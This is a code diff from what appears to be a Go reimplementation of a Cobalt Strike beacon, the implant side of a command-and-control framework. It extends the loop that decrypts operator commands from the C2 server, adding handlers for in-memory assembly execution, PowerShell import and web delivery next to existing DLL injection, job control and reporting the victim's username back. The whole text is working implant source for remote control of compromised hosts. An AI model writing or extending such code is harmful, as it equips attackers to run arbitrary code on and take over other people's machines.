@@ -45,7 +45,14 @@ func main() {
 						}
 						cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
 						if cmdBuf != nil {
-							fmt.Printf("Cmd type %d, Cmd buffer: %s\nCmd buffer bytes: %v\n", cmdType, cmdBuf, cmdBuf)
+							fmt.Printf("Cmd type %d\n", cmdType)
+							if len(cmdBuf) > 100 {
+								fmt.Printf("Cmd buffer: %s\n", cmdBuf[:100])
+								fmt.Printf("Cmd buffer bytes: %v\n", cmdBuf[:100])
+							} else {
+								fmt.Printf("Cmd buffer: %s\n", cmdBuf)
+								fmt.Printf("Cmd buffer bytes: %v\n", cmdBuf)
+							}
 							var execErr error
 							execErr = nil
 							// replyType can be found at beacon.BeaconC2 process_beacon_callback_decrypted
@@ -80,12 +87,25 @@ func main() {
 								fallthrough
 							case command.CMD_TYPE_INJECT_X64:
 								execErr = command.InjectDll(cmdBuf)
+							case command.CMD_TYPE_EXEC_ASM_TOKEN_X86:
+								fallthrough
+							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X86:
+								fallthrough
+							case command.CMD_TYPE_EXEC_ASM_TOKEN_X64:
+								fallthrough
+							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64:
+								// TODO exec asm in memory
+								execErr = command.ExecAsm(cmdBuf)
 							case command.CMD_TYPE_JOB:
 								execErr = command.HandlerJobAsync(cmdBuf)
 							case command.CMD_TYPE_LIST_JOBS:
 								execErr = command.ListJobs()
 							case command.CMD_TYPE_JOBKILL:
 								execErr = command.KillJob(cmdBuf)
+							case command.CMD_TYPE_IMPORT_PS:
+								command.PowershellImport(cmdBuf)
+							case command.CMD_TYPE_WEB_DELIVERY:
+								command.WebDelivery(cmdBuf)
 							case command.CMD_TYPE_GET_UID:
 								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
 								packet.PushResult(finalPacket)
